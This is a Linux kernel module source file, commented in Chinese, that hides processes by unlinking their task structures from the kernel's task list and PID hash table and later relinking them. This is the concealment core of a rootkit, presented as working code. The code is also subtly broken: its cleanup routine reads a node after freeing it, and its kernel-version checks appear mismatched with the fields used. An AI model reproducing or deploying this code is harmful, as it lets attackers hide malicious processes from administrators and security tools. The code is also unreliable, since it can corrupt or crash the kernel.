#include <linux/version.h>
#include <linux/init_task.h>
#include <linux/pid.h>       // 引入pid相关函数定义
#include <linux/rculist.h>   // RCU链表操作
#include <linux/sched/signal.h>  // 完善task_struct定义
#include <linux/slab.h>      // kmalloc/kfree
#include "hide_pid.h"

// 隐藏PID的链表管理
static LIST_HEAD(hidden_pid_list_head);
static DEFINE_MUTEX(pid_list_lock);  // 保护链表操作的互斥锁

struct pid_node {
    pid_t pid_number;
    struct task_struct *task;
    struct list_head list;
};

// 隐藏进程（摘链操作）
void hide_process(pid_t pid_number)
{
    struct pid_node *node;
    struct task_struct *task;
    struct hlist_node *pid_node;
    struct pid *pid;

    // 查找PID对应的内核结构
    pid = find_vpid(pid_number);
    if (!pid || IS_ERR(pid)) {
        printk(KERN_ERR "PID %d not found (err: %ld)\n", pid_number, PTR_ERR(pid));
        return;
    }

    // 获取进程描述符
    task = pid_task(pid, PIDTYPE_PID);
    if (!task) {
        printk(KERN_ERR "Task for PID %d not found\n", pid_number);
        return;
    }

    // 定位PID在哈希表中的节点（兼容新老内核）
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
    pid_node = &task->pid_links[PIDTYPE_PID];
#else
    struct pid_link *link = &task->pids[PIDTYPE_PID];
    pid_node = &link->node;
#endif

    mutex_lock(&pid_list_lock);

    // 从进程链表和PID哈希表中移除（RCU安全操作）
    list_del_rcu(&task->tasks);
    INIT_LIST_HEAD(&task->tasks);  // 初始化空链表避免访问错误
    hlist_del_rcu(pid_node);
    INIT_HLIST_NODE(pid_node);

    synchronize_rcu();  // 等待RCU同步

    // 分配节点并加入隐藏列表
    node = kmalloc(sizeof(*node), GFP_KERNEL);
    if (!node) {
        printk(KERN_ERR "Alloc failed for PID %d\n", pid_number);
        mutex_unlock(&pid_list_lock);
        return;
    }

    node->pid_number = pid_number;
    node->task = task;
    list_add_tail(&node->list, &hidden_pid_list_head);

    printk(KERN_INFO "PID %d hidden\n", pid_number);
    mutex_unlock(&pid_list_lock);
}

// 恢复进程（重新链入）
void restore_process(pid_t pid_number)
{
    struct pid_node *entry, *next;
    struct hlist_node *pid_node;
    int found = 0;

    mutex_lock(&pid_list_lock);

    // 遍历隐藏列表查找目标PID
    list_for_each_entry_safe(entry, next, &hidden_pid_list_head, list) {
        if (entry->pid_number != pid_number)
            continue;

        // 恢复进程到链表和哈希表（RCU安全操作）
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
        pid_node = &entry->task->pid_links[PIDTYPE_PID];
#else
        struct pid_link *link = &entry->task->pids[PIDTYPE_PID];
        pid_node = &link->node;
#endif

        // 恢复到PID哈希表
        hlist_add_head_rcu(pid_node, &entry->task->thread_pid->tasks[PIDTYPE_PID]);
        // 恢复到进程链表
        list_add_tail_rcu(&entry->task->tasks, &init_task.tasks);

        // 从隐藏列表移除并释放节点
        list_del(&entry->list);
        kfree(entry);
        found = 1;
        printk(KERN_INFO "PID %d restored\n", pid_number);
        break;
    }

    if (!found)
        printk(KERN_WARNING "PID %d not in hidden list\n", pid_number);

    mutex_unlock(&pid_list_lock);
}

// 模块卸载时清理：恢复所有隐藏进程
void hide_exit(void)
{
    struct pid_node *entry, *next;

    mutex_lock(&pid_list_lock);

    list_for_each_entry_safe(entry, next, &hidden_pid_list_head, list) {
        struct hlist_node *pid_node;

        // 恢复进程链表和哈希表
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
        pid_node = &entry->task->pid_links[PIDTYPE_PID];
#else
        struct pid_link *link = &entry->task->pids[PIDTYPE_PID];
        pid_node = &link->node;
#endif

        hlist_add_head_rcu(pid_node, &entry->task->thread_pid->tasks[PIDTYPE_PID]);
        list_add_tail_rcu(&entry->task->tasks, &init_task.tasks);

        // 清理节点
        list_del(&entry->list);
        kfree(entry);
        printk(KERN_INFO "PID %d restored on exit\n", entry->pid_number);
    }

    mutex_unlock(&pid_list_lock);
}